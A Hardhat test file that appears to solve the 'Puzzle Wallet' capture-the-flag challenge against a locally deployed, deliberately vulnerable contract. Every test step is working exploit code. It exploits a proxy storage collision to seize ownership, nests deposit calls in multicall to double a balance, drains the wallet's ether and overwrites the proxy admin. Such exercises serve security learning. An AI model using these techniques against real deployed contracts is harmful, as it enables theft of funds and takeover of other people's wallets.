import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { BigNumber } from "ethers";
import { deployments, ethers, getNamedAccounts } from "hardhat";

import { PuzzleProxy, PuzzleWallet, PuzzleWalletFactory } from "../typechain";

chai.use(solidity);

describe("Hacker", () => {
  let hacker: SignerWithAddress;
  let puzzleWalletFactory: PuzzleWalletFactory;
  let puzzleWallet: PuzzleWallet;
  let puzzleProxy: PuzzleProxy;

  const oneETH = ethers.utils.parseEther("1");

  before(async () => {
    await deployments.fixture(["PuzzleWalletFactory"]);
    puzzleWalletFactory = await ethers.getContract("PuzzleWalletFactory");
    hacker = await ethers.getSigner((await getNamedAccounts()).hacker);
  });

  it("initialize a PuzzleWallet and setup the game", async () => {
    const tx = await puzzleWalletFactory.createInstance({
      value: oneETH,
    });
    const receipt = await tx.wait();
    if (receipt.events && receipt.events[0].args) {
      puzzleWallet = await ethers.getContractAt(
        "PuzzleWallet",
        receipt.events[0].args.wallet
      );
      puzzleProxy = await ethers.getContractAt(
        "PuzzleProxy",
        receipt.events[0].args.wallet
      );
    }

    // The admin of proxy should be factory.
    expect(await puzzleProxy.admin()).to.be.equal(puzzleWalletFactory.address);

    // The owner of wallet should be factory.
    expect(await puzzleWallet.owner()).to.be.equal(puzzleWalletFactory.address);
    // The maxBalance has been corrupted already.
    // @NOTE: Proxy is such...
    expect(await puzzleWallet.maxBalance()).to.be.gt(0);
  });

  context("Attack", () => {
    it("propose new admin for proxy, it should update owner for wallet", async () => {
      await puzzleProxy.proposeNewAdmin(hacker.address);
      // @NOTE: You are the owner already. This is Proxy! Do you like it? 🤪
      expect(await puzzleWallet.owner()).to.be.equal(hacker.address);
    });

    it("add hacker in whitelist", async () => {
      // @NOTE: You are the owner of the wallet now, do everything wanted freely.
      await puzzleWallet.connect(hacker).addToWhitelist(hacker.address);
      expect(await puzzleWallet.whitelisted(hacker.address)).to.be.equal(true);
    });

    it("manipulate hacker balance to be double", async () => {
      // @NOTE: Overall, you are gonna deposit twice with 1 ether. Basically it seems not allowed, but...
      // construct calldata for deposit
      const data1 = puzzleWallet.interface.encodeFunctionData("deposit");
      // construct calldata for multicall with deposit calldata, which will break the twice deposit restriction
      const data2 = puzzleWallet.interface.encodeFunctionData("multicall", [
        [data1],
      ]);
      // execute multicall with two calldatas, you will see a miracle! 🤐
      await puzzleWallet.connect(hacker).multicall([data1, data2], {
        value: oneETH,
      });
      // check your balance
      // @NOTE: Your balance is 2, but you did deposit only 1 ether.
      expect(await puzzleWallet.balances(hacker.address)).to.be.equal(
        oneETH.mul(2)
      );
    });

    it("drain all ether out from the wallet", async () => {
      // @NOTE: The wallet had 1 ether before you manipulated your balance.
      // Your balance is now 2 ether, but the wallet has 2 ether, not 3 ether. Thank angel 😇
      await puzzleWallet
        .connect(hacker)
        .execute(hacker.address, oneETH.mul(2), "0x");
      // The wallet balance should be 0
      expect(
        await ethers.provider.getBalance(puzzleWallet.address)
      ).to.be.equal(0);
    });

    it("set maxBalance again, it should finally change the admin of the proxy", async () => {
      // @NOTE: Now you have all the conditions satisfied, you can set maxBalance.
      // The real purpose of the long journey. That is to change maxBalance, which is the admin essentially.
      // The real vulnerability of delegatecall. 🤓
      await puzzleWallet
        .connect(hacker)
        .setMaxBalance(BigNumber.from(hacker.address));
      expect(await puzzleProxy.admin()).to.be.equal(hacker.address);
      // @NOTE: You completely hijacked the wallet.
    });
  });
});
